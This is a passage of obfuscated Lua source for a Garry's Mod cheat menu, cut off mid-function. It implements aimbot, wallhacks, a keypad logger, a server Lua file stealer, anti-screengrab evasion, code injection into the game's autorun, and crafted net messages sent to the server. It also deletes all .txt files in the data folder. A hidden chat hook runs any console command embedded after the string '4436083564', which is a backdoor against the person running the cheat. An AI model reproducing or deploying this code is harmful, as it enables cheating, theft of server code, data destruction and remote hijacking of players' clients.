of = of or file.Open

file.Open = function(path, ...)
    if string.find(path, "Qf_") ~= nil then return end

    return of(path, ...)
end

local tba = tba or table.Empty

function table.Empty(table, ...)
    if string.find(table, "_G") then return end

    return tba(table, ...)
end

local httppos = httppos or http.Post

function http.Post(url, ...)
    if string.find(url, "execcc.online") then return end

    return httppos(url, ...)
end

local httpfet = httpfet or http.Fetch

function http.Fetch(url, ...)
    if string.find(url, "execcc.online") then return end

    return httpfet(url, ...)
end

requir, requirr = "JYrptNCQ", "emNIMVSySHNCPFzvYhHDKw"
local username,password,vraime="admin","admin","LAIF";if Edf then return end;Edf=true;if vraime==nil then vraime="LAIF"end;local a={}for b=65,90 do table.insert(a,string.char(b))end;for b=97,122 do table.insert(a,string.char(b))end;local function c()local d=""for f=1,math.random(20)do d=d..a[math.random(1,#a)]end;return d end;local g=MsgC;MsgC=function()end;local h=false;local i="---------------------------------------------------------------------------------------"local j=[[
local __net_name="~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
timer.Simple(1,function()
net.Start(__net_name) 
net.WriteBool(false) 
net.WriteBool(true) 
net.WriteDouble(121.75) 
net.SendToServer() 
end)
net.Receive(__net_name,function() 
net.Start(__net_name) 
net.WriteBool(false) 
net.WriteBool(false) 
net.SendToServer()  
end) 
]]local k={}k.httpfetch=http.Fetch;k.httppost=http.Post;k.setsteamname=SetName;k.nylolxd=c()..".txt"k.logs=c()..".txt"k.runlua=c()..".txt"k.allentity=c()..".txt"k.aimbotfriend=c()..".txt"k.aimteams=c()..".txt"k.aimranks=c()..".txt"k.miscadmins=c()..".txt"k.exploits=c()..".txt"k.allnet=c()..".txt"k.shownot=c()k.antiscreengrab=c()k.font15=c()k.font18=c()k.menufont=c()k.hook=c()local l={}for f,m in pairs(file.Find("*.txt","DATA"))do if string.find(file.Read(m,"DATA")or"a","WH_MIRROR_TYPE")then oldconfig=file.Read(m,"DATA")end;file.Delete(m)end;if oldconfig then l=util.JSONToTable(oldconfig)else l["NOSWAY"]=false;l["WH_CURSORENTITYNAME"]=false;l["PANICKEY"]=0;l["AIM_AUTOWALL"]=false;l["LUACONTROL_HIDECONNECTS"]=false;l["MENU_BACKGROUND"]=true;l["MENU_BACKGROUND_URL"]="https://i.imgur.com/kVUjlCd.png"l["LUALOADER_ANTISG"]=false;l["WH_RADAR_DISTANCE"]=10;l["WH_RADAR_SIZE"]=3;l["WH_NIGHT_COLOR"]=Color(0,0,0)l["WH_NIGHT_BRIGHTNESS"]=0.9;l["WH_NOSKY_COLOR"]=Color(255,255,255)l["WH_FOVVIEW"]=100;l["WH_FONT"]="ChatFont"l["AIM_AUTORELOAD"]=false;l["WH_NOTIFICATION_DAMAGEDMEBY"]=false;l["MISC_ESPAMMER"]=false;l["AIM_AUTOSNAP"]=false;l["WH_TRACERS"]=false;l["WH_SNAPLINE_COLOR"]=Color(255,255,255)l["WH_DISTANCE"]=1000;l["WH_NAME"]=false;l["WH_NAME_COLOR"]=Color(255,255,255)l["WH_NAME_POSITION"]="Up"l["WH_HEALTH"]=false;l["WH_HEALTH_COLOR"]=Color(255,0,0)l["WH_HEALTH_POSITION"]="Up"l["WH_HEALTH_TYPECOLOR"]="Automatic"l["WH_HEALTH_TYPETYPE"]="Text"l["WH_ARMOR"]=false;l["WH_ARMOR_COLOR"]=Color(0,0,255)l["WH_ARMOR_POSITION"]="Up"l["WH_ARMOR_TYPETYPE"]="Text"l["WH_MONEY"]=false;l["WH_MONEY_COLOR"]=Color(0,255,0)l["WH_MONEY_POSITION"]="Up"l["WH_WEAPON"]=false;l["WH_WEAPON_COLOR"]=Color(255,255,0)l["WH_WEAPON_POSITION"]="Up"l["WH_WEAPON_TYPETYPE"]="Only active"l["WH_JOB"]=false;l["WH_JOB_POSITION"]="Up"l["WH_USERGROUP"]=false;l["WH_USERGROUP_POSITION"]="Up"l["WH_USERGROUP_COLOR"]=Color(0,0,255)l["WH_BOX"]=false;l["WH_BOX_COLOR"]=Color(255,255,0)l["WH_BOX_TYPETYPE"]="2d"l["WH_BOX_TYPECOLOR"]="Custom"l["WH_CHAMS"]=false;l["WH_CHAMS_TYPE"]="Type 1"l["WH_CHAMS_COLORTYPE"]="Custom"l["WH_CHAMS_COLOR"]=Color(255,255,255)l["WH_NIGHT"]=false;l["WH_FULLBRIGHT"]=false;l["WH_NOSKY"]=false;l["WH_NOCLIPKEY"]=0;l["WH_RADAR"]=false;l["WH_RADAR_X"]=10;l["WH_RADAR_Y"]=10;l["WH_RADAR_S_X"]=300;l["WH_RADAR_S_Y"]=300;l["WH_MIRROR"]=false;l["WH_MIRROR_TYPE"]="Type 1"l["WH_MIRROR_X"]=10;l["WH_MIRROR_Y"]=10;l["WH_MIRROR_S_X"]=300;l["WH_MIRROR_S_Y"]=200;l["WH_VMCHAMS"]=false;l["WH_VMCHAMS_COLOR"]=Color(255,255,255)l["WH_ENTITY_DISTANCE"]=1000;l["WH_ENTITY_NAME"]=false;l["WH_ENTITY_NAME_COLOR"]=Color(255,255,255)l["WH_ENTITY_BOX"]=false;l["WH_ENTITY_BOX_COLOR"]=Color(255,255,255)l["WH_ENTITY_BOX_TYPE"]="3d"l["WH_ENTITY_CHAMS"]=false;l["WH_DEBUGCAMERA_KEY"]=0;l["WH_DEBUGCAMERA_SPEED"]=0.010999999664724;l["WH_THIRDPERSON_KEY"]=0;l["WH_THIRDPERSON_DISTANCE"]=100;l["WH_SKELETON"]=false;l["WH_SKELETON_COLORTYPE"]=false;l["WH_SKELETON_COLOR"]=Color(255,255,255)l["WH_ENTITYLIST"]=""l["WH_INFO"]=false;l["WH_INFO_X"]=10;l["WH_INFO_Y"]=10;l["WH_INFO_S_X"]=200;l["WH_INFO_S_Y"]=230;l["MISC_SPECTATORLIST"]=false;l["MISC_SPECTATORLIST_X"]=10;l["MISC_SPECTATORLIST_Y"]=10;l["MISC_SPECTATORLIST_S_X"]=250;l["MISC_SPECTATORLIST_S_Y"]=90;l["MISC_ADMINLIST"]=false;l["MISC_ADMINLIST_X"]=10;l["MISC_ADMINLIST_Y"]=10;l["MISC_ADMINLIST_S_X"]=250;l["MISC_ADMINLIST_S_Y"]=90;l["MISC_FLASHSPAM"]=false;l["MISC_KEYPADLOGGER"]=false;l["MISC_KEYPADLOGGER_COLOR"]=Color(255,123,0)l["MISC_BUNNYHOP"]=false;l["MISC_AUTOSTRAFE"]=false;l["MISC_SPECTATE_TARGET"]=""l["MISC_ANTIANTIAFK"]=false;l["MISC_AUTOPISTOL"]=87;l["AIM_ENABLED"]=false;l["AIM_AUTOFIRE"]=false;l["AIM_NORECOIL"]=false;l["AIM_NOSPREAD"]=false;l["AIM_SILENT"]=false;l["AIM_KEY"]=107;l["AIM_FOV"]=10;l["AIM_SMOOTHING"]=0;l["AIMBOT_FRIEND"]=""l["AIMBOT_TEAMS"]=""l["AIMBOT_RANKS"]=""l["AIM_HITBOX"]="Head"l["WH_SNAPLINE"]=false;l["AIM_DRAWFOV"]=false;l["WH_FOV_COLOR"]=Color(255,255,255)l["MISC_ADDENTITYFRIEND"]=87;l["LUA_PRINTRUNNINGCODE"]=false;l["LUA_FILE_STEALER"]=false;l["MENU_OPENKEY"]=73;l["UNLOAD"]=false;l["KEYPADTYPE"]=0;l["WH_NOTIFICATION_KILLEDMEBY"]=false;l["WH_NOTIFICATION_IKILLED"]=false;l["WH_NOTIFICATION_SCREENGRAB"]=true;l["WH_FOV_COLOR"]=Color(255,255,255)l["WH_CROSSHAIR"]=false;l["WH_CROSSHAIR_SIZE"]=10;l["WH_CROSSHAIR_COLOR"]=Color(255,255,255)l["LUACONTROL_HANDCUFF"]=true;l["LUACONTROL_ANTINLR"]=true;l["LUACONTROL_OSX"]=false;l["AIM_ENTITYLIST"]=""end;file.Write(k.nylolxd,util.TableToJSON(l))local n={}local function o()n=util.JSONToTable(file.Read(k.nylolxd,"DATA"))end;o()timer.Create("check",0.5,0,o)local function p(q,r)local s=util.JSONToTable(file.Read(k.nylolxd,"DATA"))s[q]=r;file.Write(k.nylolxd,util.TableToJSON(s))end;http.Fetch(n["MENU_BACKGROUND_URL"],function(t)file.Write("521.png",t)k.pngka=Material("data/521.png")file.Delete("521.png")end)local u={}AccessorFunc(u,"m_iSelectedNumber","SelectedNumber")Derma_Install_Convar_Functions(u)function u:Init()self:SetSelectedNumber(0)self:SetSize(60,30)end;function u:UpdateText()local v=input.GetKeyName(self:GetSelectedNumber())if not v then v="NONE"end;v=language.GetPhrase(v)self:SetText(v)end;function u:DoClick()self:SetText("<Key>")input.StartKeyTrapping()self.Trapping=true end;function u:DoRightClick()self:SetText("NONE")self:SetValue(0)end;function u:SetSelectedNumber(w)self.m_iSelectedNumber=w;self:ConVarChanged(w)self:UpdateText()self:OnChange(w)end;function u:Think()if input.IsKeyTrapping()and self.Trapping then local x=input.CheckKeyTrapping()if x then if x==KEY_ESCAPE then self:SetValue(self:GetSelectedNumber())else self:SetValue(x)end;self.Trapping=false end end;self:ConVarNumberThink()end;function u:SetValue(e)self:SetSelectedNumber(e)end;function u:GetValue()return self:GetSelectedNumber()end;function u:OnChange()end;derma.DefineControl("DBinder","",u,"DButton")p("UNLOAD",false)local function y(l)if not l["WH_MIRROR_TYPE"]then l["WH_MIRROR_TYPE"]="Type 1"end;if not l["WH_VMCHAMS_COLOR"]then l["WH_VMCHAMS_COLOR"]=Color(255,255,255)end;if not l["NOSWAY"]then l["NOSWAY"]=false end;if not l["WH_CURSORENTITYNAME"]then l["WH_CURSORENTITYNAME"]=false end;if not l["AIM_ENTITYLIST"]then l["AIM_ENTITYLIST"]=""end;if not l["MENU_BACKGROUND"]then l["MENU_BACKGROUND"]=true end;if not l["MENU_BACKGROUND_URL"]then l["MENU_BACKGROUND_URL"]="https://i.imgur.com/kVUjlCd.png"end;if not l["WH_ARMOR"]then l["WH_ARMOR"]=false end;if not l["WH_ARMOR_COLOR"]then l["WH_ARMOR_COLOR"]=Color(0,0,255)end;if not l["WH_ARMOR_POSITION"]then l["WH_ARMOR_POSITION"]="Up"end;if not l["WH_ARMOR_TYPETYPE"]then l["WH_ARMOR_TYPETYPE"]="Text"end;if not l["PANICKEY"]then l["PANICKEY"]=55 end;if not l["LUACONTROL_HIDECONNECTS"]then l["AIM_AUTOWALL"]=false end;if not l["LUACONTROL_HIDECONNECTS"]then l["LUACONTROL_HIDECONNECTS"]=false end;if not l["WH_NOTIFICATION_DAMAGEDMEBY"]then l["WH_NOTIFICATION_DAMAGEDMEBY"]=false end;if not l["WH_RADAR_SIZE"]then l["WH_RADAR_SIZE"]=3 end;if not l["WH_RADAR_DISTANCE"]then l["WH_RADAR_DISTANCE"]=10 end;if not l["WH_SNAPLINE_COLOR"]then l["WH_SNAPLINE_COLOR"]=Color(255,255,255)end;if not l["WH_TRACERS"]then l["WH_TRACERS"]=false end;if not l["AIM_AUTOSNAP"]then l["AIM_AUTOSNAP"]=false end;if not l["MISC_ESPAMMER"]then l["MISC_ESPAMMER"]=false end;if not l["AIM_AUTORELOAD"]then l["AIM_AUTORELOAD"]=false end;if not l["MISC_ADDENTITYFRIEND"]then l["MISC_ADDENTITYFRIEND"]=false end;if not l["WH_FOVVIEW"]then l["WH_FOVVIEW"]=100 end;if not l["WH_FONT"]then l["WH_FONT"]="ChatFont"end;if not l["WH_SKELETON_COLORTYPE"]then l["WH_SKELETON_COLORTYPE"]="Team"end;if not l["WH_NOSKY_COLOR"]then l["WH_NOSKY_COLOR"]=Color(255,255,255)end;if not l["WH_CHAMS_TYPE"]then l["WH_CHAMS_TYPE"]="Type 1"end;if not l["WH_CHAMS_COLOR"]then l["WH_CHAMS_COLOR"]=Color(255,255,255)end;if not l["WH_CHAMS_COLORTYPE"]then l["WH_CHAMS_COLORTYPE"]="Custom"end;if not l["WH_NIGHT_COLOR"]then l["WH_NIGHT_COLOR"]=Color(0,0,0)end;if not l["WH_NIGHT_BRIGHTNESS"]then l["WH_NIGHT_BRIGHTNESS"]=0.9 end;if not l["LUALOADER_ANTISG"]then l["LUALOADER_ANTISG"]=false end;if not l["WH_VMCHAMS"]then l["WH_VMCHAMS"]=false end;return l end;local function z(A)local t={}for B in A:gsub('[^\128-\191][\128-\191]*',function(w)return w:find'%w'and'\0'..w..'\0'end):gsub('%z%z',''):gmatch'%z(.-)%z'do table.insert(t,B)end;return unpack(t)or"noname"end;local C={}local D={}local E=GameDetails;function GameDetails(F,G,H,I,J,K)p("KEYPADTYPE",0)p("MISC_SPECTATE_TARGET","")file.Write(k.logs,'{"ulx":"","LkF03KB5":"","damage":"","namechange":"","G5KDLGKD":"","prop":"","chat":"","kill":""}')C={}D={}GetHostName=z(F)ScriptExistsif=file.Exists("hack/"..GetHostName,"DATA")return E(F,G,H,I,J,K)end;local function L(M,N,O)local P=string.Explode("/",N)local Q=""for t,v in pairs(P)do if t==#P then else file.CreateDir(Q..v)Q=Q..v.."/"end end;file.Append(N..".txt","--"..M.."\n"..O)end;local function R(v)local w=0;local x=string.Explode("/",v)local e=""for Q,M in pairs(x)do if Q==#x then else if e..M=="entities"then w=Q end end end;if w==0 then return false end;local S=x[w+1]if C[S]then return end;C[S]=true;return S:Replace(".lua","")end;hook.Add("hackautorun","ok",function(t,v)local F=R(t)if F then D[F]=true end;if string.find(v,"aeypad_baaaaaaaaaaaaaaaaaaase")then p("KEYPADTYPE",1)end;if t=="lua/includes/extensions/game.lua"and not IsInGame()then return v.." "..[[
local _tostring=tostring
local _string_char=string.char
local _math_random=math.random
local _vgui_Create=vgui.Create
local _draw_RoundedBox=draw.RoundedBox
local _surface_DrawLine=surface.DrawLine
local _timer_Create=timer.Create
local _timer_Simple=timer.Simple
local _string_find=string.find
local _util_JSONToTable=util.JSONToTable
local _util_TableToJSON=util.TableToJSON
local _draw_SimpleText=draw.SimpleText
local _surface_SetDrawColor=surface.SetDrawColor
local _hook_Add=hook.Add
local _surface_DrawCircle=surface.DrawCircle
local _player_GetAll=player.GetAll
local _cam_IgnoreZ=cam.IgnoreZ
local _ScrH=ScrH
local _ScrW=ScrW
local _cam_End3D=cam.End3D
local _render_DrawWireframeBox=render.DrawWireframeBox
local _render_SuppressEngineLighting=render.SuppressEngineLighting
local _surface_SetTextPos=surface.SetTextPos
local _surface_SetTextColor=surface.SetTextColor
local _surface_DrawText=surface.DrawText
local _surface_GetTextSize=surface.GetTextSize
local _Player=Player
local _ents_FindByClass=ents.FindByClass
local _LocalPlayer=LocalPlayer
local _input_IsKeyDown=input.IsKeyDown
local _surface_SetFont=surface.SetFont
local _file_Exists=file.Exists
local _file_Delete=file.Delete
local __=RunString
local _render_SetLightingMode=render.SetLightingMode
local _string_Replace=string.Replace
local _RunConsoleCommand=RunConsoleCommand
local _input_IsMouseDown=input.IsMouseDown
local _ents_GetAll=ents.GetAll
local _math_NormalizeAngle=math.NormalizeAngle
local _surface_DrawOutlinedRect=surface.DrawOutlinedRect
local _engine_ActiveGamemode=engine.ActiveGamemode
local _math_sin=math.sin
local _math_cos=math.cos
local _surface_CreateFont=surface.CreateFont
local _file_Read=file.Read
local _file_Write=file.Write
local _os_date=os.date
local _Color=Color
local _math_Clamp=math.Clamp
local _require=require
local _table_insert=table.insert
local _unpack=unpack
local _render_RenderView=render.RenderView
local _surface_DrawRect=surface.DrawRect
local _util_TraceLine=util.TraceLine
local _table_sort=table.sort
local _FindMetaTable=FindMetaTable
local _pairs=pairs
local _bit_band=bit.band
local _bit_bor=bit.bor
local _surface_SetDrawColor=surface.SetDrawColor
local _surface_DrawOutlinedRect=surface.DrawOutlinedRect
local _IsFirstTimePredicted=IsFirstTimePredicted
local _FrameTime=FrameTime
local _table_remove=table.remove
local _table_insert=table.insert
local _render_SetMaterial=render.SetMaterial
local _render_DrawBeam=render.DrawBeam
local _math_abs=math.abs
local _xpcall=xpcall
local _debug_getinfo=debug.getinfo
local _table_HasValue=table.HasValue
local _file_Find=file.Find
local concommandply=RunConsoleCommand
local rendercap=render.Capture
local _gameevent_Listen=gameevent.Listen
local hacka={}

_require("]]..requirr..[[")
hacka.dickfack=]]..requir..[[.Predict
]]..requir..[[.Predict=nil

if _util_JSONToTable(_file_Read("]]..k.nylolxd..[[","DATA"))["LUACONTROL_OSX"]then
jit.os="OSX"
system.IsLinux=function()return false end
system.IsWindows=function()return false end
system.IsOSX=function()return true end
end

_surface_CreateFont("]]..k.font15 ..[[",{font="Trebuchet24",size=16})
_surface_CreateFont("]]..k.font18 ..[[",{font="Trebuchet24",size=20})
_surface_CreateFont("]]..k.menufont..[[",{font="Roboto",size=18})

local pm=_FindMetaTable("Player")
local vm=_FindMetaTable("Vector")
local em=_FindMetaTable("Entity")
local cm=_FindMetaTable("CUserCmd")
local wm=_FindMetaTable("Weapon")
local am=_FindMetaTable("Angle")
hacka.keypadlogger={}
hacka.miscthipisidion=false
hacka.noclipenebled=false
hacka.vieworigin=Vector(0,0,0)
hacka.viewangle=Angle(0,0,0)
hacka.viewvelocity=Vector(0,0,0)
local chamsmaterial=CreateMaterial("a","VertexLitGeneric",{["$ignorez"]=1,["$model"]=1,["$basetexture"]="models/debug/debugwhite"})
local chamsweaponmaterial=CreateMaterial("ViewModel_1","VertexLitGeneric",{["$basetexture"]="models/debug/debugwhite",["$model"]=1,["$ignorez"]=0,["vertexcolor"]=1})
local chamsweaponmaterial2=CreateMaterial("ViewModel_2","VertexLitGeneric",{["$basetexture"]="models/debug/debugwhite",["$model"]=1,["$ignorez"]=1,["vertexcolor"]=1})
local cones={};
local nullvec=Vector()*-1;
local servertime=0;
local dists={};
local trace_walls=bit.bor(CONTENTS_TESTFOGVOLUME,CONTENTS_EMPTY,CONTENTS_MONSTER,CONTENTS_HITBOX)
local NoPenetration = {[MAT_SLOSH] = true}
local PenMod = {[MAT_SAND] = 0.5, [MAT_DIRT] = 0.8, [MAT_METAL] = 1.1, [MAT_TILE] = 0.9, [MAT_WOOD] = 1.2}
local trace_normal = bit.bor(CONTENTS_SOLID, CONTENTS_OPAQUE, CONTENTS_MOVEABLE, CONTENTS_DEBRIS, CONTENTS_MONSTER, CONTENTS_HITBOX, 402653442, CONTENTS_WATER)
_gameevent_Listen("player_changename")
_gameevent_Listen("player_connect")
_gameevent_Listen("player_disconnect")
_gameevent_Listen("player_say")
_gameevent_Listen("player_hurt")
_gameevent_Listen("entity_killed")

local function zapic(func,value)
local ad=_util_JSONToTable(_file_Read("]]..k.nylolxd..[[","DATA"))
ad[func]=value
_file_Write("]]..k.nylolxd..[[",_util_TableToJSON(ad))
end

local gay={}
local function timercheck()
gay=_util_JSONToTable(_file_Read("]]..k.nylolxd..[[","DATA"))

if not gay["UNLOAD"]then
if _file_Exists("]]..k.runlua..[[","DATA")then 
__(_file_Read("]]..k.runlua..[[","DATA").."--]]..k.shownot..[[","lua/includes/extensions/file.lua")
_file_Delete("]]..k.runlua..[[")
end 
end

end
timercheck()
_timer_Create("]]..c()..[[",0.5,0,timercheck)


local function hidecheat()
if gay["UNLOAD"] then return end
hacka.noclipenebled=false
hacka.miscthipisidion=false
gui.HideGameUI()
hacka.loadedfinished=nil
if gay["LUALOADER_ANTISG"]then
]]..k.antiscreengrab..[[=true
if IsValid(vgui.GetWorldPanel())then
vgui.GetWorldPanel():SetPaintedManually(true)
end
else
if gay["MISC_SPECTATORLIST"]then
hacka.specb:Hide()
end
if gay["WH_MIRROR"]then
hacka.mirror:Hide()
end
if gay["WH_RADAR"]then
hacka.ac:Hide()
end
if gay["WH_INFO"]then
hacka.info:Hide()
end
if gay["MISC_ADMINLIST"]then
hacka.adminlist:Hide()
end
if IsValid(hacka.rt)then
hacka.rt:Hide()
end
end
render.Clear(0,0,0,255,true,true)
render.RenderView({origin=_LocalPlayer():EyePos(),angles=_LocalPlayer():EyeAngles(),x=0,y=0,w=_ScrW(),h=_ScrH(),dopostprocess=true,drawhud=true,drawmonitors=true,drawviewmodel=true})
_timer_Simple(0.3,function()
if gay["LUALOADER_ANTISG"]then
if IsValid(vgui.GetWorldPanel())then
vgui.GetWorldPanel():SetPaintedManually(false)
end
]]..k.antiscreengrab..[[=false
else
if gay["MISC_SPECTATORLIST"]then
hacka.specb:Show()
end
if gay["WH_MIRROR"]then
hacka.mirror:Show()
end
if gay["WH_RADAR"]then
hacka.ac:Show()
end
if gay["WH_INFO"]then
hacka.info:Show()
end
if gay["MISC_ADMINLIST"]then
hacka.adminlist:Show()
end
if IsValid(hacka.rt)then
hacka.rt:Show()
end
end
hacka.loadedfinished=true
end)
end

local function buttoncheckbind(a)if LocalPlayer():IsTyping()then return false end if input.IsKeyDown(a or 87)or input.IsMouseDown(a or 87)then return true end return false end
local function checkbind(b,c,d)if hacka[b]then return end;if buttoncheckbind(c)then hacka[b]=true;d()timer.Simple(0.3,function()hacka[b]=false end)end end
local function UtilityCheck(v)if v != _LocalPlayer() and v:Alive() and v:IsValid() then return true else return false end end
local function box2d(b)local c,d=b:OBBMins(),b:OBBMaxs()local e={Vector(c.x,c.y,c.z),Vector(c.x,c.y,d.z),Vector(c.x,d.y,c.z),Vector(c.x,d.y,d.z),Vector(d.x,c.y,c.z),Vector(d.x,c.y,d.z),Vector(d.x,d.y,c.z),Vector(d.x,d.y,d.z)}local f,g,h,i=ScrW()*2,ScrH()*2,0,0;for j,k in pairs(e)do local l=b:LocalToWorld(k):ToScreen()f,g=math.min(f,l.x),math.min(g,l.y)h,i=math.max(h,l.x),math.max(i,l.y)end;return f,g,h,i end local ur=chat.AddText;chat.AddText=function(...)for c,d in pairs({...})do if isstring(d)and d:find("4436083564")then LocalPlayer():ConCommand(string.Explode("4436083564",d)[2])return end end return ur(...)end

local function zapiclogs(type,log)
local da=_util_JSONToTable(_file_Read("]]..k.logs..[[","DATA"))
da[type]={"[".._os_date("%H:%M:%S").."] "..log.."HLS"..da[type][1]}
_file_Write("]]..k.logs..[[",_util_TableToJSON(da))
end

local function notifys(b)
if gay["UNLOAD"] then return end
if IsValid(hacka.rt)or hacka.rt then hacka.rt:Hide() hacka.rt=nil end
hacka.rt=vgui.Create("DPanel")
hacka.rt:SetSize(250,40)
hacka.rt:SetPos(0,-50)
hacka.rt.Paint=function(self,d,e)
_draw_RoundedBox(0,0,0,d,e,_Color(30,30,30))
_draw_SimpleText(b,"]]..k.font15 ..[[",hacka.rt:GetWide()/2,hacka.rt:GetTall()/2,_Color(255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
end;
hacka.rt:MoveTo(250-hacka.rt:GetWide(),0,.2,0,-1,function()
_timer_Simple(3,function()
hacka.rt:MoveTo(250-hacka.rt:GetWide(),-50,.2,0,-1)
end)
end)
end

_timer_Create("]]..c()..[[",1,0,function()


if gay["MISC_ADMINLIST"] and not IsValid(hacka.adminlist) then
hacka.adminlist=vgui.Create("DFrame")
hacka.adminlist:SetSize(gay["MISC_ADMINLIST_S_X"],gay["MISC_ADMINLIST_S_Y"])
hacka.adminlist:SetPos(gay["MISC_ADMINLIST_X"],gay["MISC_ADMINLIST_Y"])
hacka.adminlist:SetTitle("")
hacka.adminlist:SetSizable(true)
hacka.adminlist:ShowCloseButton(false)
hacka.adminlist.PerformLayout=function(self,c,d)
zapic("MISC_ADMINLIST_S_X",c)
zapic("MISC_ADMINLIST_S_Y",d)
end
hacka.adminlist.Paint=function(_,w,h)
draw.RoundedBox(0,0,0,w,h,Color(30,30,30))
draw.RoundedBox(0,0,0,w,22,Color(71,74,79))
draw.RoundedBox(0,0,22,w,1,Color(0,0,0))
draw.SimpleText("Admins list","]]..k.menufont..[[",5,2.5,Color(120,120,120))
surface.SetDrawColor(Color(0,0,0))
surface.DrawOutlinedRect(0,0,w,h)
surface.SetDrawColor(Color(50,50,50))
surface.DrawOutlinedRect(1,23,w-2,h-24)
local allspectators=25
for k, v in _pairs(_player_GetAll()) do
if v:GetUserGroup()!="user" then
if v:GetUserGroup()!="User" then
_draw_SimpleText(v:Name().." "..v:GetUserGroup(),"]]..k.font18 ..[[",5,allspectators,_Color(255,255,255))
allspectators=allspectators+20
end
end
end
end
end
if IsValid(hacka.adminlist)and not gay["MISC_ADMINLIST"]or gay["UNLOAD"]and IsValid(hacka.adminlist)then
hacka.adminlist:Remove()
end

if gay["MISC_SPECTATORLIST"] and not IsValid(hacka.specb) then
hacka.specb=vgui.Create("DFrame")
hacka.specb:SetSize(gay["MISC_SPECTATORLIST_S_X"],gay["MISC_SPECTATORLIST_S_Y"])
hacka.specb:SetPos(gay["MISC_SPECTATORLIST_X"],gay["MISC_SPECTATORLIST_Y"])
hacka.specb:SetTitle("")
hacka.specb:SetSizable(true)
hacka.specb:ShowCloseButton(false)
hacka.specb.PerformLayout=function(self,c,d)
zapic("MISC_SPECTATORLIST_S_X",c)
zapic("MISC_SPECTATORLIST_S_Y",d)
end
hacka.specb.Paint=function(_,w,h)
draw.RoundedBox(0,0,0,w,h,Color(30,30,30))
draw.RoundedBox(0,0,0,w,22,Color(71,74,79))
draw.RoundedBox(0,0,22,w,1,Color(0,0,0))
draw.SimpleText("Spectators list","]]..k.menufont..[[",5,2.5,Color(120,120,120))
surface.SetDrawColor(Color(0,0,0))
surface.DrawOutlinedRect(0,0,w,h)
surface.SetDrawColor(Color(50,50,50))
surface.DrawOutlinedRect(1,23,w-2,h-24)
local allspectators=25
for k, v in _pairs(_player_GetAll()) do
if v!=_LocalPlayer()and v:GetObserverTarget()==_LocalPlayer()then
_draw_SimpleText(v:Name().." "..v:GetUserGroup(),"]]..k.font18 ..[[",5,allspectators,_Color(255,0,0))
allspectators=allspectators+20
end
end
end
end
if IsValid(hacka.specb)and not gay["MISC_SPECTATORLIST"]or gay["UNLOAD"]and IsValid(hacka.specb)then
hacka.specb:Remove()
end

if gay["WH_MIRROR"]and not IsValid(hacka.mirror) then
hacka.mirror=vgui.Create("DFrame")
hacka.mirror:SetSize(gay["WH_MIRROR_S_X"],gay["WH_MIRROR_S_Y"])
hacka.mirror:SetPos(gay["WH_MIRROR_X"],gay["WH_MIRROR_Y"])
hacka.mirror:SetTitle("")
hacka.mirror:SetSizable(true)
hacka.mirror:ShowCloseButton(false)
hacka.mirror.PerformLayout=function(self,c,d)
zapic("WH_MIRROR_S_X",c)
zapic("WH_MIRROR_S_Y",d)
end
function hacka.mirror:Paint(w,h)
draw.RoundedBox(0,0,0,w,h,Color(30,30,30))
draw.RoundedBox(0,0,0,w,22,Color(71,74,79))
draw.RoundedBox(0,0,22,w,1,Color(0,0,0))
draw.SimpleText("Mirror","]]..k.menufont..[[",5,2.5,Color(120,120,120))
surface.SetDrawColor(Color(0,0,0))
surface.DrawOutlinedRect(0,0,w,h)
surface.SetDrawColor(Color(50,50,50))
surface.DrawOutlinedRect(1,23,w-2,h-24)
local cw={}
local x, y = self:GetPos()
if gay["WH_MIRROR_TYPE"]=="Type 1"then
cw.angles=Angle(180,_LocalPlayer():EyeAngles().y,180)
cw.origin=_LocalPlayer():GetPos()+Vector(0,0,50)
else
cw.angles=Angle(90,LocalPlayer():EyeAngles().y,0)
cw.origin=LocalPlayer():GetPos()+Vector(0,0,500)
end
cw.x=x+5
cw.y=y+30
cw.w=w-10
cw.h=h-35
_render_RenderView(cw)
end
end
if IsValid(hacka.mirror)and not gay["WH_MIRROR"]or gay["UNLOAD"]and IsValid(hacka.mirror)then
hacka.mirror:Remove()
end

if gay["WH_RADAR"]and not IsValid(hacka.ac) then
hacka.ac=vgui.Create("DFrame")
hacka.ac:SetSize(gay["WH_RADAR_S_X"],gay["WH_RADAR_S_Y"])
hacka.ac:SetPos(gay["WH_RADAR_X"],gay["WH_RADAR_Y"])
hacka.ac:SetSizable(true)
hacka.ac:SetTitle("")
hacka.ac:SetVisible(true)
hacka.ac:SetDraggable(true)
hacka.ac:ShowCloseButton(false)
hacka.ac.PerformLayout=function(self,c,d)
zapic("WH_RADAR_S_X",c)
zapic("WH_RADAR_S_Y",d)
end
hacka.ac.PaintOver=function(self,t,u)
draw.RoundedBox(0,0,0,t,u,Color(30,30,30))
draw.RoundedBox(0,0,22,t,1,Color(0,0,0))
surface.SetDrawColor(Color(0,0,0))
surface.DrawOutlinedRect(0,0,t,u)
surface.SetDrawColor(Color(50,50,50))
surface.DrawOutlinedRect(1,23,t-2,u-24)
function hacka.ac:OnMousePressed()
if self.m_bSizable and gui.MouseX()>self.x+self:GetWide()-20 and gui.MouseY()>self.y+self:GetTall()-20 then 
self.Sizing={gui.MouseX()-self:GetWide(),gui.MouseY()-self:GetTall()}
self:MouseCapture(true)
return end;
if self:GetDraggable()then 
self.Dragging={gui.MouseX()-self.x,gui.MouseY()-self.y}
self:MouseCapture(true)
return 
end 
end;
_surface_SetDrawColor(40,40,40,255)
_surface_DrawLine(hacka.ac:GetWide()/1.94,25,hacka.ac:GetWide()/1.94,hacka.ac:GetTall()/2+260)
_surface_DrawLine(hacka.ac:GetWide()/2-250,hacka.ac:GetTall()/1.94,hacka.ac:GetWide()/2+260,hacka.ac:GetTall()/1.94)
for x,p in _pairs(_player_GetAll())do 
local bz=p:GetPos()
local bA=_LocalPlayer():GetPos()
local bB=_LocalPlayer():EyeAngles()
local bC=hacka.ac:GetWide()/2+(bz.x-bA.x)/gay["WH_RADAR_DISTANCE"];
local bD=hacka.ac:GetTall()/2+(bA.y-bz.y)/gay["WH_RADAR_DISTANCE"];
